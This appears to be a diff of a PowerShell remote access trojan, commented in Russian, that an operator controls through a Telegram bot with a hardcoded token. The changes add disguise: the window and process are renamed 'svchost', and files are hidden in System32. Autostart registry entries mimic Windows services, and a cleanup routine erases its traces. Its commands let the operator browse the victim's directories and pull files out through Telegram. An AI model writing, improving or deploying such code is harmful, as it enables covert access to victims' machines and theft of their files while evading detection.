@@ -1,4 +1,4 @@
-# RAT через Telegram Bot - РАДИКАЛЬНО ИСПРАВЛЕННАЯ ВЕРСИЯ
+# RAT через Telegram Bot - МАСКИРОВАННАЯ ВЕРСИЯ
 $Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
 $ChatID = "5674514050"
 
@@ -11,10 +11,26 @@ Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 
-# Скрытие окна PowerShell
-$windowCode = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
-$windowAPI = Add-Type -MemberDefinition $windowCode -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
-$windowAPI::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0) | Out-Null
+# Скрытие окна PowerShell через изменение заголовка окна
+$windowCode = @"
+using System;
+using System.Runtime.InteropServices;
+public class WindowHider {
+    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
+    [DllImport("user32.dll")] public static extern int SetWindowText(IntPtr hWnd, string text);
+}
+"@
+Add-Type -TypeDefinition $windowCode
+$consolePtr = [WindowHider]::GetConsoleWindow()
+[WindowHider]::ShowWindow($consolePtr, 0) | Out-Null
+[WindowHider]::SetWindowText($consolePtr, "svchost") | Out-Null
+
+# Изменение имени процесса для диспетчера задач
+try {
+    $process = Get-Process -Id $pid
+    $process.ProcessName = "svchost"
+} catch { }
 
 # Очистка истории RUN при запуске
 try {
@@ -116,36 +132,146 @@ function Compress-Folder {
     }
 }
 
-# РАДИКАЛЬНОЕ ИСПРАВЛЕНИЕ: Полная перезапись системы установки
-# Уникальная установка в автозагрузку с двойной проверкой
-$installMarker = "$env:TEMP\rat_installed.marker"
+# Функция очистки RAT (интегрированный cleanup.ps1)
+function Invoke-Cleanup {
+    # Отправляем начало очистки
+    Send-Telegram "🔍 Начинается полная очистка RAT..."
+
+    # 1. Завершаем все процессы RAT
+    Send-Telegram "🔄 Этап 1: Завершение процессов RAT"
+
+    $processes = Get-Process | Where-Object {
+        $_.ProcessName -eq "powershell" -or 
+        $_.ProcessName -eq "pwsh" -or
+        $_.ProcessName -eq "cmd"
+    }
+
+    foreach ($process in $processes) {
+        try {
+            $cmdLine = (Get-WmiObject Win32_Process -Filter "ProcessId = $($process.Id)").CommandLine
+            if ($cmdLine -like "*WindowsSystem*" -or $cmdLine -like "*svchost.exe*" -or $cmdLine -like "*Windows Defender Security*" -or $cmdLine -like "*spoolsv.exe*" -or $cmdLine -like "*System32Logs*" -or $cmdLine -like "*8429674512*") {
+                Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
+            }
+        } catch { }
+    }
+
+    # 2. Удаляем файлы RAT
+    Send-Telegram "🔄 Этап 2: Удаление файлов RAT"
+
+    $filesToDelete = @(
+        "$env:WINDIR\System32\Microsoft.NET\Framework64\v4.0.30319\Config\svchost.exe",
+        "$env:TEMP\WindowsSystem.exe",
+        "$env:TEMP\cleanup_*.ps1",
+        "$env:WINDIR\System32\drivers\etc\hosts_backup\spoolsv.exe",
+        "$env:TEMP\rat_installed.marker",
+        "$env:WINDIR\System32\System32Logs\svchost.exe",
+        "$env:TEMP\windows_update.marker"
+    )
+
+    $deletedFiles = @()
+    foreach ($filePattern in $filesToDelete) {
+        try {
+            Get-ChildItem -Path $filePattern -ErrorAction SilentlyContinue | ForEach-Object {
+                Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
+                $deletedFiles += $_.FullName
+            }
+        } catch { }
+    }
+
+    # 3. Очищаем автозагрузку реестра
+    Send-Telegram "🔄 Этап 3: Очистка реестра"
+
+    $regPaths = @(
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce", 
+        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
+        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
+    )
+
+    $regEntries = @()
+    foreach ($regPath in $regPaths) {
+        try {
+            $value1 = Get-ItemProperty -Path $regPath -Name "Windows Defender Security" -ErrorAction SilentlyContinue
+            if ($value1) {
+                Remove-ItemProperty -Path $regPath -Name "Windows Defender Security" -Force -ErrorAction SilentlyContinue
+                $regEntries += "$regPath\Windows Defender Security"
+            }
+            
+            $value2 = Get-ItemProperty -Path $regPath -Name "Windows Audio Service" -ErrorAction SilentlyContinue
+            if ($value2) {
+                Remove-ItemProperty -Path $regPath -Name "Windows Audio Service" -Force -ErrorAction SilentlyContinue
+                $regEntries += "$regPath\Windows Audio Service"
+            }
+            
+            $value3 = Get-ItemProperty -Path $regPath -Name "System32 Logs Service" -ErrorAction SilentlyContinue
+            if ($value3) {
+                Remove-ItemProperty -Path $regPath -Name "System32 Logs Service" -Force -ErrorAction SilentlyContinue
+                $regEntries += "$regPath\System32 Logs Service"
+            }
+        } catch { }
+    }
+
+    # 4. Очищаем историю RUN
+    Send-Telegram "🔄 Этап 4: Очистка истории RUN"
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
+
+    # 5. Финальный отчет
+    $report = @"
+✅ ОЧИСТКА RAT ЗАВЕРШЕНА
+
+Удаленные файлы:
+$($deletedFiles -join "`n")
+
+Удаленные записи реестра:
+$($regEntries -join "`n")
+
+Все следы RAT успешно удалены.
+"@
+
+    Send-Telegram $report
+    return $true
+}
+
+# Установка в автозагрузку с улучшенной маскировкой
+$installMarker = "$env:TEMP\windows_update.marker"
 
 # Проверяем, не установлен ли уже RAT
 if (!(Test-Path $installMarker)) {
-    # Создаем маркер установки
-    "Installed $(Get-Date)" | Out-File -FilePath $installMarker -Encoding UTF8
+    # Создаем маркер установки с безобидным именем
+    "Windows Update Helper - $(Get-Date)" | Out-File -FilePath $installMarker -Encoding UTF8
     
-    # Уникальная папка для установки
-    $hiddenFolder = "$env:WINDIR\System32\drivers\etc\hosts_backup"
+    # Новая скрытая папка в системной директории
+    $hiddenFolder = "$env:WINDIR\System32\System32Logs"
     if (!(Test-Path $hiddenFolder)) { 
         New-Item -Path $hiddenFolder -ItemType Directory -Force | Out-Null
-        attrib +s +h "$hiddenFolder" 2>&1 | Out-Null
+        # Скрываем папку системными атрибутами
+        attrib +s +h +r "$hiddenFolder" 2>&1 | Out-Null
     }
     
-    $scriptPath = "$hiddenFolder\spoolsv.exe"
+    $scriptPath = "$hiddenFolder\svchost.exe"
     
     # Копируем скрипт только если его там нет
     if (!(Test-Path $scriptPath)) {
         $scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
         $scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8
+        # Устанавливаем скрытые атрибуты на файл
+        attrib +s +h +r "$scriptPath" 2>&1 | Out-Null
     }
     
-    # Установка в автозагрузку с уникальным именем
+    # Установка в автозагрузку с новым маскированным именем
     $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
     
-    $uniqueName = "Windows Audio Service"
+    # Новое маскированное имя для реестра
+    $uniqueName = "System32 Logs Service"
     Set-ItemProperty -Path $regPath -Name $uniqueName -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
+    
+    # Дополнительная установка в другую ветку реестра для надежности
+    $regPath2 = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+    try {
+        if (!(Test-Path $regPath2)) { New-Item -Path $regPath2 -Force | Out-Null }
+        Set-ItemProperty -Path $regPath2 -Name "Windows System Logs" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
+    } catch { }
 }
 
 # Основные переменные
@@ -153,7 +279,7 @@ $currentDir = "C:\"
 $global:LastSentMessage = ""
 $global:LastUpdateId = 0
 
-# РАДИКАЛЬНОЕ ИСПРАВЛЕНИЕ: Полная очистка истории сообщений при запуске
+# Очистка истории сообщений при запуске
 try {
     $clearUrl = "https://api.telegram.org/bot$Token/getUpdates?offset=-1"
     Invoke-RestMethod -Uri $clearUrl -Method Get -UseBasicParsing | Out-Null
@@ -166,7 +292,7 @@ Send-Telegram "RAT активирован на $env:COMPUTERNAME
 /ls - список файлов
 /cd [папка] - сменить директорию
 /download [файл] - скачать файл
-/kill - самоуничтожение"
+/destroy - самоуничтожение"
 
 # Основной цикл опроса
 while ($true) {
@@ -189,7 +315,7 @@ while ($true) {
 /ls - список файлов в текущей директории
 /cd [папка] - сменить директорию
 /download [файл] - скачать файл или папку
-/kill - самоуничтожение RAT"
+/destroy - самоуничтожение RAT"
                         }
                         "^/ls$" {
                             $items = Get-ChildItem -Path $currentDir -Force
@@ -249,72 +375,23 @@ $($fileList -join "`n")"
                                 Send-Telegram "Файл/папка не найдены: $target"
                             }
                         }
-                        "^/kill$" {
+                        "^/destroy$" {
                             Send-Telegram "🔄 Запуск процедуры самоуничтожения..."
                             
                             try {
-                                # Создаем временный скрипт очистки с запасным URL
-                                $cleanupContent = @'
-# Альтернативный cleanup скрипт
-$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
-$ChatID = "5674514050"
-
-function Send-Telegram {
-    param([string]$Message)
-    $url = "https://api.telegram.org/bot$Token/sendMessage"
-    $body = @{chat_id = $ChatID; text = $Message}
-    try { Invoke-RestMethod -Uri $url -Method Post -Body $body -UseBasicParsing | Out-Null } catch { }
-}
-
-Send-Telegram "🔄 Запуск альтернативной очистки..."
-
-# Удаляем файлы
-$files = @(
-    "$env:WINDIR\System32\drivers\etc\hosts_backup\spoolsv.exe",
-    "$env:TEMP\rat_installed.marker",
-    "$env:WINDIR\System32\Microsoft.NET\Framework64\v4.0.30319\Config\svchost.exe"
-)
-
-foreach ($file in $files) {
-    if (Test-Path $file) {
-        try { Remove-Item $file -Force -ErrorAction SilentlyContinue } catch { }
-    }
-}
-
-# Очищаем автозагрузку
-$regPaths = @(
-    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
-    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce", 
-    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-)
-
-foreach ($regPath in $regPaths) {
-    try {
-        Remove-ItemProperty -Path $regPath -Name "Windows Audio Service" -Force -ErrorAction SilentlyContinue
-        Remove-ItemProperty -Path $regPath -Name "Windows Defender Security" -Force -ErrorAction SilentlyContinue
-    } catch { }
-}
-
-# Очищаем историю RUN
-Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
-
-Send-Telegram "✅ Альтернативная очистка завершена"
-'@
+                                # Запускаем встроенную функцию очистки
+                                $cleanupResult = Invoke-Cleanup
                                 
-                                $cleanupPath = "$env:TEMP\cleanup_$(Get-Random).ps1"
-                                $cleanupContent | Out-File -FilePath $cleanupPath -Encoding UTF8
-                                
-                                # Запускаем скрипт очистки
-                                Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$cleanupPath`"" -WindowStyle Hidden
-                                
-                                # Даем время на запуск cleanup
-                                Start-Sleep -Seconds 2
-                                
-                                # Завершаем текущий процесс
-                                Stop-Process -Id $pid -Force
+                                if ($cleanupResult) {
+                                    # Даем время на отправку финального сообщения
+                                    Start-Sleep -Seconds 3
+                                    
+                                    # Завершаем текущий процесс
+                                    Stop-Process -Id $pid -Force
+                                }
                                 
                             } catch {
-                                Send-Telegram "❌ Ошибка при самоуничтожении"
+                                Send-Telegram "❌ Ошибка при самоуничтожении: $($_.Exception.Message)"
                                 
                                 # Аварийная очистка
                                 try {
